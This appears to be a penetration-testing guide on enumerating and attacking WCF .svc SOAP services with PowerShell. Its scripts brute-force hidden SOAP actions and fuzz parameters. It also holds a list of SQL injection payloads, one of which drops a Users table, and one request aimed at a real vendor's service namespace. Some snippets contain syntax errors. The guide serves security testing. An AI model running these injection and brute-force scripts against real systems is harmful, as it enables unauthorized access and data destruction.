# 1. Enumerating SOAP Endpoints with PowerShell
Enumerating endpoints is the process of identifying and gathering information about the various service methods and functionalities that a web service (like a `.svc` file in a WCF service) exposes. This is a critical step in web service penetration testing because it helps you map out the attack surface before attempting any specific exploits.

## 1.1 Identify Accessible `.svc` URLs and Files
The first step is to identify the presence of `.svc` files on the target application. These files often expose WCF (Windows Communication Foundation) services over HTTP/HTTPS and can be endpoints for various services. This typically looks something like:

**PowerShell Example to Enumerate `.svc` Files:**
You can use PowerShell to search for `.svc` files within the application directory or through web crawling.

```
$target_url = "http://<target_ip>:<target_port>/"
$web_crawler = New-Object System.Net.WebClient
$html_content = $web_crawler.DownloadString($target_url)

# Search for .svc files in the HTML content
$svc_files = Select-String -InputObject $html_content -Pattern "\.svc" -AllMatches | ForEach-Object { $_.Matches } | Select-Object -ExpandProperty Value

$svc_files | ForEach-Object { Write-Output "$target_url$_" }
```

This script downloads the HTML content of the specified URL and searches for `.svc` files within it.

```
http://<target_ip>:<target_port>/Service.svc
```

Replace `<target_ip>` and `<target_port>` with the actual IP address and port of the target server.

## 1.2 Fetch the `.svc` WSDL (Web Services Description Language) File
WSDL files provide a description of the web service, including its operations, messages, and data types. Accessing the WSDL is crucial because it offers insight into the serviceâ€™s structure and functionality. The WSDL file describes the web service, including the available endpoints, operations, data types, and communication protocols. This file is often accessible via the `.svc` URL with the `?wsdl` parameter.

**Example PowerShell Command:**

```
$uri = "http://<target_ip>:<target_port>/Service.svc?wsdl"
$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -UseBasicParsing
$response.Content | Out-File -FilePath "C:\1_Service_WSDL_Fetch.txt"
```

- **`Invoke-WebRequest`**: This cmdlet sends an HTTP request to the specified URI and retrieves the response.
- **`-Uri $uri`**: Specifies the target URI, which is the `.svc` file with the `?wsdl` parameter to request the WSDL file.
- **`-UseBasicParsing`**: This parameter ensures compatibility with environments where Internet Explorer is not installed or configured, using a simpler parser for the HTML content.

**Analyzing the Output:**
The content returned in `$response.Content` should include the WSDL file in XML format. This file contains all the information about the service's operations (methods), endpoints, and input/output parameters.

**Sample Output:**

```
<definitions xmlns="http://schemas.xmlsoap.org/wsdl/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" ...>
    <service name="MyService">
        <port name="MyServicePort" binding="tns:MyServiceBinding">
            <soap:address location="http://<target_ip>:<target_port>/Service.svc"/>
        </port>
    </service>
    <binding name="MyServiceBinding" type="tns:MyServicePortType">
        <soap:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
        <operation name="MyMethod">
            <soap:operation soapAction="http://tempuri.org/MyMethod" style="document"/>
            <input>
                <soap:body use="literal"/>
            </input>
            <output>
                <soap:body use="literal"/>
            </output>
        </operation>
        <!-- More operations -->
    </binding>
    <!-- More bindings -->
</definitions>
```

## 1.3 Parse the `.svc` WSDL File for Endpoints and Operations
Once you have the WSDL, you can parse it to identify the exposed endpoints and operations. This is essential for understanding the attack surface. Within the WSDL file, you'll typically find the following:

- **Service Name**: The name of the service.
- **Port**: The communication port, which usually contains the URL where the service can be accessed.
- **Binding**: The protocol and data format (SOAP, HTTP, etc.).
- **Operations**: The methods available within the service, often under the `<operation>` tags.

## 1.4 Extracting Information with PowerShell
You can automate the extraction of specific details, such as operation names and their corresponding SOAP actions or HTTP methods, using PowerShell's XML handling capabilities.

You can manually inspect the WSDL content or use PowerShell to extract specific operations and their associated endpoints.

**Example: Extracting Operation Names and SOAP Actions**

```
# Convert the WSDL content to an XML object
[xml]$wsdl = $response.Content

# Define the namespaces explicitly
$namespaceManager = New-Object System.Xml.XmlNamespaceManager($wsdl.NameTable)
$namespaceManager.AddNamespace("wsdl", "http://schemas.xmlsoap.org/wsdl/")
$namespaceManager.AddNamespace("wsaw", "http://www.w3.org/2006/05/addressing/wsdl")

# Extract the operation and their corresponding SOAP actions
$operations = foreach ($operation in $wsdl.SelectNodes("//wsdl:portType/wsdl:operation", $namespaceManager)) {
	$soapActionNode = $operation.SelectSingleNode("wsdl:input", $namespaceManager).Attributes["wsaw.Action"]
	$soapAction - if ($soapActionNode) { $soapActionNode.Value } else { "N/A" }

	[PSCustomOnject]@{
		Operation = $operation.Attributes["name"].Value
		SoapAction = $soapAction
	}
}

# Display the operations
$operations | Format-Table -AutoSize | Out-File -FilePath "C:\2_Service_Operations_and_Actions.txt"
```

## 1.5 Understanding Message Structures
Each operation is associated with input and output messages, which define the structure of the request and response for that operation.

You can extract these message definitions:

```
# Extract message structures associated with operations
$messages = $wsdl.definitions.message | ForEach-Object {
    [PSCustomObject]@{
        MessageName = $_.name
        PartName = $_.part.name
        Element = $_.part.element
    }
}

# Display the extracted message structures
$messages | Format-Table -AutoSize | Out-File -FilePath "C:\3_Service_Operations_Message_Structure.txt"
```

This will help you understand the parameters that need to be included in your SOAP request for each operation.

## 1.6 SOAP Enumeration Script

```
$uri = "<https://www.example.com/Services.REST/ActivityMonitoringService.svc?wsdl>"
$outputFile = "<C:\Service_WSDL_Analysis.txt>"

# Fetch the WSDL content
$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -UseBasicParsing
$response.Content | Out-File -FilePath $outputFile

# Convert the WSDL content to an XML object
[xml]$wsdl = $response.Content

# Define the namespaces explicitly
$namespaceManager = New-Object System.Xml.XmlNamespaceManager($wsdl.NameTable)
$namespaceManager.AddNamespace("wsdl", "http://schemas.xmlsoap.org/wsdl/")
$namespaceManager.AddNamespace("wsaw", "http://www.w3.org/2006/05/addressing/wsdl")

# Extract the operations and their corresponding SOAP actions
$operations = foreach ($operation in $wsdl.SelectNodes("//wsdl:portType/wsdl:operation", $namespaceManager)) {
    $soapActionNode = $operation.SelectSingleNode("wsdl:input", $namespaceManager).Attributes["wsaw:Action"]
    $soapAction = if ($soapActionNode) { $soapActionNode.Value } else { "N/A" }

    [PSCustomObject]@{
        Operation = $operation.Attributes["name"].Value
        SoapAction = $soapAction
    }
}

# Append extracted operations and SOAP actions to the output file
$operations | Format-Table -AutoSize | Out-String | Add-Content -Path $outputFile

# Extract message structures associated with operations
$messages = $wsdl.definitions.message | ForEach-Object {
    [PSCustomObject]@{
        MessageName = $_.name
        PartName = $_.part.name
        Element = $_.part.element
    }
}

# Append extracted message structures to the output file
$messages | Format-Table -AutoSize | Out-String | Add-Content -Path $outputFile
```

# 2. Crafting SOAP Requests with PowerShell
Once you've identified potential methods, you can craft SOAP requests to interact with the service.

## 2.1 Crafting SOAP Requests Based on Extracted Information
With the operation names, SOAP actions, and message structures in hand, you can start crafting SOAP requests to interact with the service.

- Example SOAP Request for `GetAuthorizedAccountsForView`

```
$uri = "<https://www.example.com/Services.REST/ActivityMonitoringService.svc?wsdl>" 
$soapAction = "<https://www.kovai.co.uk/IActivityMonitoringService/GetAuthorizedAccountsForView>" 

$soapBody = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	<soapenv:Header/>
	<soapenv:Body>
		<GetAuthorizedAccountsForView xmlns="http://www.kovai.co.uk/services/1.0/">
			<tns:>1' or '1'='1</web:parameter>
		</GetAuthorizedAccountsForView>
	</soapenv:Body>
	</soapenv:Envelope>
"@

$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -Method POST -Body $soapBody -ContentType "text/xml" -Headers @{SOAPAction = $soapAction}

$response.Content | Out-File -FilePath "<C:\4_Service_Operations_Message_Response.txt>"


$uri = "http://<target_ip>:<target_port>/Service.svc"
$soapAction = "http://www.kovai.co.uk//IActivityMonitoringService/GetAuthorizedAccountsForView"
$soapBody = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <GetAuthorizedAccountsForView xmlns="http://www.kovai.co.uk/services/1.0/">
         <!-- Insert required parameters here -->
      </GetAuthorizedAccountsForView>
   </soapenv:Body>
</soapenv:Envelope>
"@

$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -Method POST -Body $soapBody -ContentType "text/xml" -Headers @{SOAPAction = $soapAction}
$response.Content
```

This script attempts to call different SOAP actions by name and checks the response to see if the method exists and how the server responds. This operation is likely designed to return a list of accounts that are authorized to view specific data within the service. Here's how you would construct and send this SOAP request using PowerShell.

### Step 1: Define the Target Service URI and SOAP Action

- **URI**: This is the endpoint where the `.svc` file is hosted. It usually looks something like `http://<target_ip>:<target_port>/Service.svc`.
- **SOAP Action**: This is a URI that uniquely identifies the operation you want to invoke. It is typically defined in the WSDL under the `wsaw:Action` attribute for each operation.

```
$uri = "http://<target_ip>:<target_port>/Service.svc"
$soapAction = "http://www.kovai.co.uk/services/1.0/IActivityMonitoringService/GetAuthorizedAccountsForView"
```

### Step 2: Construct the SOAP Body
The SOAP body contains the request payload, which specifies the operation you want to invoke and the parameters it requires. Here's a breakdown of the SOAP body structure:

#### 2.1 Envelope
The `Envelope` is the root element of a SOAP message. It defines the namespace and version of SOAP being used.

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
```
- **`xmlns:soapenv`**: Declares the XML namespace for the SOAP envelope, which in this case is `http://schemas.xmlsoap.org/soap/envelope/`. This namespace is standard for SOAP 1.1.

#### 2.2 Header (Optional)
The `Header` element is optional and can include metadata or control information, such as authentication tokens, transaction information, etc.

```
<soapenv:Header/>
```

- In this example, the header is empty, but in other scenarios, you might need to include security tokens or other control data here.



```
$headers = @{
    "SOAPAction" = "http://tempuri.org/Service/MethodName"
    "Authorization" = "Bearer <token>"
}

$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -Method POST -Body $soapBody -ContentType "text/xml" -Headers $headers @{SOAPAction = $soapAction}

```

#### 2.3 Body
The `Body` contains the actual request for the `GetAuthorizedAccountsForView` operation.

```
<soapenv:Body>
   <GetAuthorizedAccountsForView xmlns="http://www.kovai.co.uk/services/1.0/">
      <!-- Insert required parameters here -->
   </GetAuthorizedAccountsForView>
</soapenv:Body>
```

- **`GetAuthorizedAccountsForView`**: This is the operation (method) being called. It corresponds to one of the operations defined in the WSDL.
- **`xmlns="http://www.kovai.co.uk/services/1.0/"`**: This namespace declaration associates the operation with its corresponding service namespace as defined in the WSDL.

#### 2.4 Parameters (If Required)
If the operation requires input parameters, they would be included within the operation element (`<GetAuthorizedAccountsForView>` in this case). Since this example does not specify parameters, you would need to refer to the WSDL or service documentation to determine what parameters are required, if any.

For example, if the method required an `AccountType` parameter, it might look like this:

```
<GetAuthorizedAccountsForView xmlns="http://www.kovai.co.uk/services/1.0/">
   <AccountType>Admin</AccountType>
</GetAuthorizedAccountsForView>
```

### Step 3: Assemble the Complete SOAP Request
Putting it all together, the complete SOAP request in PowerShell looks like this:

```
$soapBody = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <GetAuthorizedAccountsForView xmlns="http://www.kovai.co.uk/services/1.0/">
         <!-- Insert required parameters here -->
      </GetAuthorizedAccountsForView>
   </soapenv:Body>
</soapenv:Envelope>
"@
```

This multi-line string (denoted by `@" ... "@`) is the SOAP body that will be sent to the server.

### Step 4: Send the SOAP Request Using `Invoke-WebRequest`
Now that you have the SOAP body constructed, you need to send it to the target service. Youâ€™ll use the `Invoke-WebRequest` cmdlet to perform this action.

```
$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -Method POST -Body $soapBody -ContentType "text/xml" -Headers @{SOAPAction = $soapAction}
```

- **`-Uri $uri`**: Specifies the endpoint of the web service.
- **`-UseDefaultCredentials`**: Enables PIV authentication.
- **`-Method POST`**: Indicates that this is a POST request, which is typical for SOAP.
- **`-Body $soapBody`**: Passes the SOAP message constructed earlier as the body of the request.
- **`-ContentType "text/xml"`**: Sets the content type to `text/xml`, which is required for SOAP requests.
- **`-Headers @{SOAPAction = $soapAction}`**: Sets the `SOAPAction` HTTP header, which is necessary to specify which operation is being invoked.

## 2.2 Analyzing the Response
After sending the request, PowerShell will store the server's response in the `$response` variable. You can then inspect this response to see the results of your SOAP request.

```
$response.Content
```

- **Success**: If the operation was successful, the response will contain the data returned by the `GetAuthorizedAccountsForView` operation.
- **Error**: If something went wrong (e.g., wrong parameters, missing authentication, etc.), the response will contain an error message.

After sending the SOAP request, analyze the response to determine if the operation succeeded, and whether it returned any useful data or errors that can be leveraged for further exploitation.

---
# 3. SOAP Action Manipulation with PowerShell
You can manipulate the SOAP Action header to test for hidden methods or unauthorized access.

```
$uri = "http://<target_ip>:<target_port>/Service.svc"
$soapAction = "http://tempuri.org/Service/HiddenMethod"
$soapBody = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:MethodName>
         <web:parameter>value</web:parameter>
      </web:MethodName>
   </soapenv:Body>
</soapenv:Envelope>
"@

$response = Invoke-WebRequest -Uri $uri -Method POST -Body $soapBody -ContentType "text/xml" -Headers @{SOAPAction = $soapAction}
$response.Content
```

## What is SOAP Action?
SOAP (Simple Object Access Protocol) is a protocol used for exchanging structured information in web services. The SOAP Action is an HTTP header used to identify the specific operation or method being requested in the SOAP message. It's essential for routing the request to the correct method on the server.

When you interact with a SOAP-based web service, the SOAP Action tells the server which operation you want to invoke. If you manipulate this header, you can potentially discover undocumented methods or access methods that might not be properly secured.

## Why Manipulate the SOAP Action?

1. **Discovery of Hidden Methods**: Developers may leave methods exposed but not documented. Manipulating the SOAP Action could reveal these hidden functionalities.
2. **Bypass Security**: If the service enforces security based on the SOAP Action, you might bypass certain restrictions by altering this header.
3. **Invoke Unauthorized Methods**: Certain methods might be restricted or intended for internal use only. Manipulating the SOAP Action can sometimes invoke these methods.

Once the request is sent, analyze the serverâ€™s response:

- **Successful Response**: Indicates that the method exists and executed successfully.
- **Error Response**: May reveal information about the service, such as the presence of a method but lack of proper input or access control.
- **No Response/Error 404**: Could indicate that the method doesnâ€™t exist or is well protected.

## Handle Potential Errors
SOAP services often return detailed error messages if something goes wrong. These can be useful for debugging your request or understanding how the service handles errors. You can handle and display errors as follows:

```
if ($response.StatusCode -ne 200) {
    Write-Host "Error: $($response.StatusCode) - $($response.StatusDescription)"
    Write-Host $response.Content
} else {
    Write-Host "Success:"
    Write-Host $response.Content
}
```

## Iterating Over Multiple Requests
If you need to test multiple methods or parameters, you can automate this with loops:

```
$methods = @("Method1", "Method2", "Method3")
$parameters = @("value1", "value2", "value3")

foreach ($method in $methods) {
    foreach ($param in $parameters) {
        $soapBody = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:$method>
         <web:parameter>$param</web:parameter>
      </web:$method>
   </soapenv:Body>
</soapenv:Envelope>
"@

        $response = Invoke-WebRequest -Uri $uri -Method POST -Body $soapBody -ContentType "text/xml"
        Write-Host "Response for $method with $param:"
        Write-Host $response.Content
    }
}
```

This loop will test each combination of methods and parameters, making it easier to discover vulnerabilities.

## Brute Forcing SOAP Actions
If you suspect that there are hidden methods but donâ€™t know their exact names, you could automate the process of testing various SOAP Actions:

```
$uri = "http://<target_ip>:<target_port>/Service.svc"
$possibleActions = @("Method1", "Method2", "Method3")  # Add more potential methods

foreach ($action in $possibleActions) {
    $soapAction = "http://tempuri.org/Service/$action"
    
    $soapBody = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:$action>
         <web:parameter>test</web:parameter>
      </web:$action>
   </soapenv:Body>
</soapenv:Envelope>
"@

    $response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -Method POST -Body $soapBody -ContentType "text/xml" -Headers @{SOAPAction = $soapAction}
    
    Write-Host "Response for SOAP Action $soapAction:"
    Write-Host $response.Content
}
```

---
# 4. Analyzing the Response
When interacting with `.svc` files in a Service.REST environment, analyzing the responses to your crafted requests is crucial. This step helps you determine whether the service is vulnerable to specific attacks and whether the payload you sent was successful. Here's a deeper dive into the process:

## 4.1 HTTP Status Codes
The HTTP status code in the response is the first indicator of how the service is handling your request. Common status codes include:

- **200 OK**: The request was successful, and the server returned the expected data. This usually means the service processed your input without error.
- **500 Internal Server Error**: The server encountered an unexpected condition. This might indicate that your payload caused an error, which could suggest a vulnerability (e.g., SQL injection or XML parsing errors).
- **403 Forbidden**: You are not authorized to access the resource. This could indicate a need to bypass authentication or authorization.
- **400 Bad Request**: The server couldn't understand the request due to malformed syntax. This might indicate that your request needs adjustment, or it could hint at how the server expects the data to be formatted.

## 4.2 Content of the Response
Beyond the status code, the body of the response provides critical information. Depending on the type of attack you attempted, you should look for specific signs:

### 4.2.1 Authentication and Authorization Bypasses
Sometimes, manipulating the SOAP Action header or other request parameters can bypass authentication or access restricted methods. Analyzing the response involves:

- **Access to Unintended Methods**: If you gain access to a method that should be restricted, the response might include unexpected data or perform actions that should require authentication.
    
    **Example in PowerShell:**

```
if ($response.Content -match "<restricted_data_pattern>") {
    Write-Host "Access to restricted method successful."
}
```

- **Status Codes**: In REST services, status codes like `200 OK` or `403 Forbidden` are critical. If you get a `200 OK` response for a request that should have been forbidden, it indicates a potential flaw.
    
    **Example in PowerShell:**

```
if ($response.StatusCode -eq 200) {
    Write-Host "Unauthorized access potentially successful."
} elseif ($response.StatusCode -eq 403) {
    Write-Host "Access forbidden, method is secured."
}
```

### 4.2.2 SQL Injection
If you attempted an SQL injection, the response might reveal information about the database or show that your payload had an effect.

- **Error Messages**: If your SQL payload caused an error, the server might return a database error message. This could include:    
    - SQL syntax errors.
    - Database table names or schema information.
    - Hints about the database type (e.g., MySQL, MSSQL).
    
    **Example of an Error Message:**    

```
<faultstring>System.Data.SqlClient.SqlException: Incorrect syntax near '1' OR '1'='1'.</faultstring>
```

- **Content Changes**: If the payload succeeded (e.g., bypassed authentication or modified data), you might see unexpected content in the response, such as a different userâ€™s data or a successful login message.

### 4.2.3 XML External Entity (XXE)
For XXE attacks, you're injecting a payload that attempts to read files or access internal resources. The response content is critical in determining success:

- **Sensitive Data in the Response**: If the attack was successful, the response might contain sensitive data from the server, such as:    
    - Contents of files (e.g., `/etc/passwd` on a Unix system).
    - Internal network information if you used XXE for SSRF (Server-Side Request Forgery).
    
    **Example Response:**

```
<web:MethodNameResponse>
   <web:return>root:x:0:0:root:/root:/bin/bash
   bin:x:1:1:bin:/bin:/sbin/nologin
   daemon:x:2:2:daemon:/sbin:/sbin/nologin</web:return>
</web:MethodNameResponse>
```

### 4.2.4 Command Injection
If you're testing for command injection, look for signs that your command executed on the server.

- **Echoed Data**: If you included a command to echo data, that data might appear in the response.
    
    **Example Response:**

```
<web:MethodNameResponse>
   <web:return>exploit</web:return>
</web:MethodNameResponse>
```

- **Altered System Behavior**: If your command modifies the server environment (e.g., creates a file), you might need to send subsequent requests to check for those changes. However, this might not be visible directly in the HTTP response.

### 4.2.5 Information Disclosure
Sometimes, the service may inadvertently reveal information that can be exploited:

- **Stack Traces**: Detailed stack traces can provide insights into the serverâ€™s structure, including software versions, file paths, and even snippets of code.
    
    **Example of a Stack Trace:**

```
<faultstring>System.NullReferenceException: Object reference not set to an instance of an object.
   at WebService.MethodName(String parameter)
   at...</faultstring>
```

- **WSDL or Metadata Information**: The response might include detailed descriptions of available methods, parameters, and data types, which can help in further crafting your attacks.
    

### 4.2.6 Timing-Based Analysis
In some cases, the response timing itself can indicate a successful attack:

- **Time Delays**: If the server response is significantly delayed after a payload designed to cause a delay (e.g., `SLEEP()` in SQL injection), this can indicate the payload was executed.
    
    **Example Scenario**:
    
    - You send a request with a SQL injection payload that includes `SLEEP(10)`.
    - The response takes 10 seconds longer than usual, indicating that the database query was executed with your injected SQL.

## 4.3 Logging and Analyzing Responses
To effectively analyze responses, especially when performing multiple tests:

- **Logging Responses**: Save all responses to log files for detailed offline analysis. This can be done using PowerShell:

```
$response = Invoke-WebRequest -Uri $uri -UseDefaultCredentials -Method POST -Body $soapBody -ContentType "text/xml"
$response.Content | Out-File -FilePath "response.xml"
```

- **Comparing Responses**: Compare responses between different payloads to identify anomalies or successful exploitation attempts.
    
- **Manual Inspection**: Sometimes, automated tools might miss subtle indicators. Manually inspecting the responses can reveal insights that tools might overlook.

# 5. Automated Interaction with .svc Files
Automating interactions with `.svc` files can be particularly useful when you need to test a service with multiple payloads or configurations, or when you want to automate the discovery of vulnerabilities across different methods or parameters. Hereâ€™s a deeper dive into the process:

## 5.1 Understanding the Context
When dealing with `.svc` files, youâ€™re typically interacting with WCF (Windows Communication Foundation) services, which might expose SOAP or RESTful web services. These services often have multiple methods with various parameters. Manual testing might not be sufficient, especially if the service has many endpoints or if you're looking for subtle vulnerabilities.

Automating these interactions allows you to:

1. **Test multiple payloads**: Different types of attacks, such as SQL injection or XXE, can be tested across different service methods.
2. **Brute-force or fuzz inputs**: You can automate the process of sending varied or malformed data to see how the service responds.
3. **Enumerate hidden methods or endpoints**: Automatically try different SOAP actions or method names to discover non-documented endpoints.

## 5.2 Setting Up Automated Testing
Here's how you can set up automated interaction using PowerShell:

### 5.2.1 Preparing the Environment
Before you start automating the interactions, you need:

- **A list of payloads**: These can be potential injections, fuzzing inputs, or SOAP actions you want to test.
- **Knowledge of the serviceâ€™s WSDL**: This will help you understand the available methods and expected inputs.

### 5.2.2 Example Script for SQL Injection Testing
Letâ€™s expand on the example provided earlier, where we automate SQL injection testing on a `.svc` file.

#### Step 1: Define the Target
Set the target service URL:

```
$uri = "http://<target_ip>:<target_port>/Service.svc"
```

#### Step 2: Define Payloads
Create a list of payloads that you want to test. These can include various SQL injection strings or other malicious inputs:

```
$payloads = @(
    "1' OR '1'='1", 
    "admin'--", 
    "' OR 1=1--", 
    "'; DROP TABLE Users;--", 
    "' AND 1=0 UNION SELECT NULL,NULL,NULL,NULL--"
)
```

#### Step 3: Define the SOAP Request Template
Since youâ€™ll be sending SOAP requests, you need a template that you can dynamically modify with different payloads:

```
$soapTemplate = @"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:MethodName>
         <web:parameter>{0}</web:parameter>
      </web:MethodName>
   </soapenv:Body>
</soapenv:Envelope>
"@
```

Here, `{0}` is a placeholder that PowerShell will replace with each payload.

#### Step 4: Automate the Interaction
Loop through each payload, replacing the placeholder in the SOAP request with the actual payload, and send the request:

```
foreach ($payload in $payloads) {
    $soapBody = -f $soapTemplate -replace "{0}", $payload

    try {
        $response = Invoke-WebRequest -Uri $uri -Method POST -Body $soapBody -ContentType "text/xml"
        Write-Host "Response for payload `$payload`:"
        Write-Host $response.Content
    }
    catch {
        Write-Host "Error encountered with payload `$payload`: $_"
    }
}
```

### 5.2.3 Analyzing the Responses
The output of each request is captured and displayed. Analyzing these responses can help you determine if a particular payload caused the service to behave unexpectedly, indicating a potential vulnerability.

- **If the service returns database errors**, it may be vulnerable to SQL injection.
- **If it returns unexpected XML or file contents**, it might be vulnerable to XXE.
- **If the service crashes or behaves erratically**, further investigation may reveal deeper issues.

### 5.2.4 Extending the Script for SOAP Action Enumeration
You can also automate the discovery of hidden or undocumented SOAP actions by modifying the script to loop through a list of potential SOAP actions:

```
$soapActions = @(
    "http://tempuri.org/Service/Method1",
    "http://tempuri.org/Service/Method2",
    "http://tempuri.org/Service/HiddenMethod"
)

foreach ($action in $soapActions) {
    try {
        $response = Invoke-WebRequest -Uri $uri -Method POST -Body $soapTemplate -ContentType "text/xml" -Headers @{SOAPAction = $action}
        Write-Host "Response for SOAP Action `$action`:"
        Write-Host $response.Content
    }
    catch {
        Write-Host "Error encountered with SOAP Action `$action`: $_"
    }
}
```

### 5.2.5 Automating Fuzzing of Parameters
For fuzzing, you can automate the generation of random or malformed data to send as input to the service:

```
function Generate-FuzzData {
    # Generate a random string of a given length
    param([int]$length = 10)
    -join ((65..90) + (97..122) + (48..57) | Get-Random -Count $length | ForEach-Object { [char]$_ })
}

foreach ($i in 1..100) {
    $fuzzData = Generate-FuzzData -length 20
    $soapBody = -f $soapTemplate -replace "{0}", $fuzzData

    try {
        $response = Invoke-WebRequest -Uri $uri -Method POST -Body $soapBody -ContentType "text/xml"
        Write-Host "Response for fuzz data `$fuzzData`:"
        Write-Host $response.Content
    }
    catch {
        Write-Host "Error encountered with fuzz data `$fuzzData`: $_"
    }
}
```

## 5.3 Benefits of Automation

1. **Efficiency**: Automation saves time and effort, especially when testing services with many methods or when you need to try a large number of payloads.
2. **Consistency**: Ensures that tests are performed uniformly across different inputs and methods.
3. **Coverage**: Allows you to cover more ground than manual testing, potentially uncovering issues that would be missed otherwise.

## 5.4 Considerations

- **Rate Limiting**: Some services may implement rate limiting, which can interfere with automated testing.
- **Error Handling**: Proper error handling in your scripts can help avoid disruptions and ensure that you capture all necessary information.
- **Ethical Concerns**: Always ensure you have permission to test the services and adhere to legal and ethical standards.

# 6. Post-Exploitation
If successful, you could potentially use PowerShell to further explore the system, extract data, or escalate privileges, depending on what the service allows you to do.
